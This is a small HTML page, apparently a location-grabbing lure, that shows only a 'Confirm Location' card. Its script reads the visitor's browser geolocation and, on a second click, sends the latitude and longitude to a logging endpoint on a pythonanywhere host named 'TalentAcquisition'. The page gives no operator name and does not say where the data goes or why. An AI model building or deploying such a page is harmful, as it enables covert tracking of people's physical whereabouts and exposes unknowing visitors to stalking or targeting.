<!DOCTYPE html>
<html>
<head>
    <title>Confirm Location</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: sans-serif;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            margin:0;
            background:#f4f4f4;
        }

        .card {
            background:white;
            padding:25px;
            border-radius:12px;
            width:90%;
            max-width:400px;
            text-align:center;
            box-shadow:0 10px 20px rgba(0,0,0,0.1);
        }

        button {
            width:100%;
            padding:12px;
            margin-top:10px;
            border:none;
            border-radius:8px;
            font-size:16px;
            cursor:pointer;
        }

        .btn {
            background:#007bff;
            color:white;
        }

        #status {
            margin-top:10px;
            font-size:14px;
            color:gray;
        }
    </style>
</head>
<body>

<div class="card">

    <h3>📍 Confirm Location</h3>

    <button class="btn" onclick="getLocation()">Get Location</button>

    <p id="status"></p>

    <button onclick="sendLocation()" style="background:#28a745;color:white;">
        Confirm Location
    </button>

</div>

<script>

let lat = null;
let lon = null;

function getLocation() {

    document.getElementById("status").innerText = "Detecting location...";

    navigator.geolocation.getCurrentPosition(
        (pos) => {
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;

            document.getElementById("status").innerText = "Location ready ✔ Click Confirm";
        },
        () => {
            document.getElementById("status").innerText = "Permission denied ❌";
        }
    );
}

function sendLocation() {

    if (!lat || !lon) {
        alert("Get location first");
        return;
    }

    let url = "https://TalentAcquisition.pythonanywhere.com/log"
        + "?lat=" + lat
        + "&lon=" + lon
        + "&ip=web"
        + "&type=confirmed";

    fetch(url)
    .then(() => {
        document.getElementById("status").innerText = "Saved ✔";
    })
    .catch(() => {
        document.getElementById("status").innerText = "Failed ❌";
    });
}

</script>

</body>
</html>
